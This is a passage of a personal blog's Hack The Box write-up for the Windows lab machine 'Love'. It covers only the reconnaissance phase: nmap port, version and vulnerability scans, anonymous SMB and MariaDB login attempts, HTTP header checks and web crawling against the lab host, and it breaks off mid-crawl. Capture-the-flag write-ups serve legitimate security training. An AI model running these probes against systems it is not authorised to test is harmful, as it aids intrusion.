@@ -1,0 +1,1433 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Windows box.">
+    
+    <title>
+        
+            Love | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Love<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-20</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/love/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#smb-port-445-tcp">SMB (port 445&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#anonymous-login">Anonymous login</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#common-credentials">Common credentials</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#known-cves">Known CVEs</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#mariadb-port-3306-tcp">MariaDB (port 3306&#x2F;tcp)</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#apache-port-80-tcp">Apache (port 80&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#technology-lookup">Technology lookup</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#common-credentials-1">Common credentials</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#under-the-hood">Under the hood</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#sqli">SQLi</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#site-crawling">Site crawling</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#directory-fuzzing">Directory fuzzing</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#known-cves-1">Known CVEs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#staging-love-htb-subdomain">staging.love.htb subdomain</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#under-the-hood-1">Under the hood</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#exploration">Exploration</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#under-the-hood-2">Under the hood</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#ssrf">SSRF</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#voting-system-dashboard">Voting system dashboard</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#foothold-file-upload">Foothold (File upload)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#version">Version</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#windows-defender">Windows Defender</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#amsi">AMSI</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#firewall">Firewall</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#tokens">Tokens</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#shares">Shares</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#environment-variables">Environment variables</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#listening-ports">Listening ports</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#processes">Processes</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#user-autologon">User autologon</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#credential-manager">Credential manager</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#alwaysinstallelevated">AlwaysInstallElevated</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#privilege-escalation-always-install-elevated">Privilege escalation (Always Install Elevated)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#preparation-1">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#exploitation-1">Exploitation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/love/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2021-05-01</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/157669">pwnmeow</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.12</code>, while the target machine's IP address will be <code>10.10.10.239</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Love using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.239<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn
+</span><span class="z-text z-plain">443/tcp   open  https
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds
+</span><span class="z-text z-plain">3306/tcp  open  mysql
+</span><span class="z-text z-plain">5000/tcp  open  upnp
+</span><span class="z-text z-plain">5040/tcp  open  unknown
+</span><span class="z-text z-plain">5985/tcp  open  wsman
+</span><span class="z-text z-plain">5986/tcp  open  wsmans
+</span><span class="z-text z-plain">7680/tcp  open  pando-pub
+</span><span class="z-text z-plain">47001/tcp open  winrm
+</span><span class="z-text z-plain">49664/tcp open  unknown
+</span><span class="z-text z-plain">49665/tcp open  unknown
+</span><span class="z-text z-plain">49666/tcp open  unknown
+</span><span class="z-text z-plain">49667/tcp open  unknown
+</span><span class="z-text z-plain">49668/tcp open  unknown
+</span><span class="z-text z-plain">49669/tcp open  unknown
+</span><span class="z-text z-plain">49670/tcp open  unknown
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.239<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 80,135,139,443,445,3306,5000,5040,5985,5986,7680<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE      VERSION
+</span><span class="z-text z-plain">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+</span><span class="z-text z-plain">135/tcp  open  msrpc        Microsoft Windows RPC
+</span><span class="z-text z-plain">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+</span><span class="z-text z-plain">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+</span><span class="z-text z-plain">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+</span><span class="z-text z-plain">3306/tcp open  mysql?
+</span><span class="z-text z-plain">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+</span><span class="z-text z-plain">5040/tcp open  unknown
+</span><span class="z-text z-plain">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="z-text z-plain">5986/tcp open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="z-text z-plain">7680/tcp open  pando-pub?
+</span><span class="z-text z-plain">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Love is running Windows. That's good to know!</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if it finds something interesting.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.239<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 80,135,139,443,445,3306,5000,5040,5985,5986,7680<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE
+</span><span class="z-text z-plain">80/tcp   open  http
+</span><span class="z-text z-plain">| http-cookie-flags: 
+</span><span class="z-text z-plain">|   /: 
+</span><span class="z-text z-plain">|     PHPSESSID: 
+</span><span class="z-text z-plain">|_      httponly flag not set
+</span><span class="z-text z-plain">|_http-title: Voting System using PHP
+</span><span class="z-text z-plain">135/tcp  open  msrpc
+</span><span class="z-text z-plain">139/tcp  open  netbios-ssn
+</span><span class="z-text z-plain">443/tcp  open  https
+</span><span class="z-text z-plain">| tls-alpn: 
+</span><span class="z-text z-plain">|_  http/1.1
+</span><span class="z-text z-plain">|_http-title: 403 Forbidden
+</span><span class="z-text z-plain">|_ssl-date: TLS randomness does not represent time
+</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+</span><span class="z-text z-plain">| Not valid before: 2021-01-18T14:00:16
+</span><span class="z-text z-plain">|_Not valid after:  2022-01-18T14:00:16
+</span><span class="z-text z-plain">445/tcp  open  microsoft-ds
+</span><span class="z-text z-plain">3306/tcp open  mysql
+</span><span class="z-text z-plain">5000/tcp open  upnp
+</span><span class="z-text z-plain">5040/tcp open  unknown
+</span><span class="z-text z-plain">5985/tcp open  wsman
+</span><span class="z-text z-plain">5986/tcp open  wsmans
+</span><span class="z-text z-plain">| tls-alpn: 
+</span><span class="z-text z-plain">|_  http/1.1
+</span><span class="z-text z-plain">|_ssl-date: 2023-12-19T22:36:18+00:00; +1h21m33s from scanner time.
+</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=LOVE
+</span><span class="z-text z-plain">| Subject Alternative Name: DNS:LOVE, DNS:Love
+</span><span class="z-text z-plain">| Not valid before: 2021-04-11T14:39:19
+</span><span class="z-text z-plain">|_Not valid after:  2024-04-10T14:39:19
+</span><span class="z-text z-plain">7680/tcp open  pando-pub
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">| smb2-security-mode: 
+</span><span class="z-text z-plain">|   3:1:1: 
+</span><span class="z-text z-plain">|_    Message signing enabled but not required
+</span><span class="z-text z-plain">|_clock-skew: mean: 3h21m33s, deviation: 4h00m01s, median: 1h21m32s
+</span><span class="z-text z-plain">| smb-os-discovery: 
+</span><span class="z-text z-plain">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+</span><span class="z-text z-plain">|   OS CPE: cpe:/o:microsoft:windows_10::-
+</span><span class="z-text z-plain">|   Computer name: Love
+</span><span class="z-text z-plain">|   NetBIOS computer name: LOVE\x00
+</span><span class="z-text z-plain">|   Workgroup: WORKGROUP\x00
+</span><span class="z-text z-plain">|_  System time: 2023-12-19T14:36:20-08:00
+</span><span class="z-text z-plain">| smb-security-mode: 
+</span><span class="z-text z-plain">|   account_used: &lt;blank&gt;
+</span><span class="z-text z-plain">|   authentication_level: user
+</span><span class="z-text z-plain">|   challenge_response: supported
+</span><span class="z-text z-plain">|_  message_signing: disabled (dangerous, but default)
+</span><span class="z-text z-plain">| smb2-time: 
+</span><span class="z-text z-plain">|   date: 2023-12-19T22:36:19
+</span><span class="z-text z-plain">|_  start_date: N/A
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code>'s scans found several information.</p>
+<p>The HTTP title of the web server on port <code>80/tcp</code> is set to 'Voting System using PHP'. The one on port <code>443/tcp</code> probably refuses connections as indicated by the '403 Forbidden' title, but the SSL certificate leaks a <code>staging.love.htb</code> domain!</p>
+<p>Let's add it to our hosts file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.239 love.htb staging.love.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tee</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /etc/hosts</span>
+</span></code></pre>
+<p>The <code>smb-os-discovery</code> script also found that Love was running Windows 10.</p>
+<p>Let's start our enumeration of the box with SMB!</p>
+<h2 id="smb-port-445-tcp">SMB (port <code>445/tcp</code>)</h2>
+<h3 id="anonymous-login">Anonymous login</h3>
+<p>We can try to connect to the SMB server as the <code>NULL</code> user. With a bit of luck, this will work!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> smbclient<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> //10.10.10.239<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>N</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">session setup failed: NT_STATUS_ACCESS_DENIED
+</span></code></pre>
+<p>Well, apparently it doesn't.</p>
+<h3 id="common-credentials">Common credentials</h3>
+<p>We can try common credentails too, but to no avail.</p>
+<h3 id="known-cves">Known CVEs</h3>
+<p>Let's see if SMB is vulnerable to known CVEs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.239<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 445<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> vuln</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+</span><span class="z-text z-plain">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+</span><span class="z-text z-plain">|_smb-vuln-ms10-054: false
+</span></code></pre>
+<p>Well, looks like it isn't! Let's move on to MySQL then.</p>
+<h2 id="mariadb-port-3306-tcp">MariaDB (port <code>3306/tcp</code>)</h2>
+<p>We noticed that the port <code>3306/tcp</code> was open, which probably means that a MySQL instance is running on Love. Let's explore it!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> mysql<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>h</span> 10.10.10.239</span>
+</span></code></pre>
+<p>It doesn't work, but it leaks that it's not using MySQL, but MariaDB!</p>
+<h2 id="apache-port-80-tcp">Apache (port <code>80/tcp</code>)</h2>
+<p>Let's browse to <code>http://love.htb/</code> and see which webpage is served.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/domain-homepage.png" alt="Domain homepage" /></p>
+<p>It looks like a login form to vote for something.</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Before exploring it further, let's check the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>k</span> http://love.htb/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 200 OK
+</span><span class="z-text z-plain">Date: Tue, 19 Dec 2023 22:54:44 GMT
+</span><span class="z-text z-plain">Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+</span><span class="z-text z-plain">X-Powered-By: PHP/7.3.27
+</span><span class="z-text z-plain">Set-Cookie: PHPSESSID=k5ni7uvk435l5versa6hqvvvti; path=/
+</span><span class="z-text z-plain">Expires: Thu, 19 Nov 1981 08:52:00 GMT
+</span><span class="z-text z-plain">Cache-Control: no-store, no-cache, must-revalidate
+</span><span class="z-text z-plain">Pragma: no-cache
+</span><span class="z-text z-plain">Content-Type: text/html; charset=UTF-8
+</span></code></pre>
+<p>Alright, so this confirms <code>nmap</code>'s scripts output.</p>
+<h3 id="technology-lookup">Technology lookup</h3>
+<p>Just in case, let's look up the technologies in use with the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>So it confirms what we already discovered, but it also reveals that this website is using Bootstrap and libraries like jQuery.</p>
+<h3 id="common-credentials-1">Common credentials</h3>
+<p>We can try to enter common credentials, but it doesn't work. It returns this error message:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/love/domain-homepage-id-error.png" alt="Domain homepage ID error" /></p>
+<p>We may be able to bruteforce valid IDs! But we would still need a valid password.</p>
+<h3 id="under-the-hood">Under the hood</h3>
+<p>When we press the 'Sign In' button, a POST request is actually sent to <code>/login.php</code> with the data:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">voter=username&amp;password=password&amp;login=
+</span></code></pre>
+<p>The response code is <code>302</code> in case of an invalid login request, which redirects to <code>/index.php</code>.</p>
+<h3 id="sqli">SQLi</h3>
+<p>I tried some SQLi payloads, but none were successful.</p>
+<h3 id="site-crawling">Site crawling</h3>
+<p>Let's crawl the website to see there are hidden files and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> katana<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://love.htb/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[INF] Started standard crawling for =&gt; http://love.htb/
+</span><span class="z-text z-plain">http://love.htb/
+</span><span class="z-text z-plain">http://love.htb/bower_components/jquery-slimscroll/jquery.slimscroll.min.js
+</span><span class="z-text z-plain">http://love.htb/bower_components/fastclick/lib/fastclick.js
+</span><span class="z-text z-plain">http://love.htb/bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js
+</span><span class="z-text z-plain">http://love.htb/plugins/iCheck/icheck.min.js
+</span><span class="z-text z-plain">http://love.htb/dist/js/adminlte.min.js
+</span><span class="z-text z-plain">http://love.htb/bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css
+</span><span class="z-text z-plain">http://love.htb/plugins/iCheck/all.css
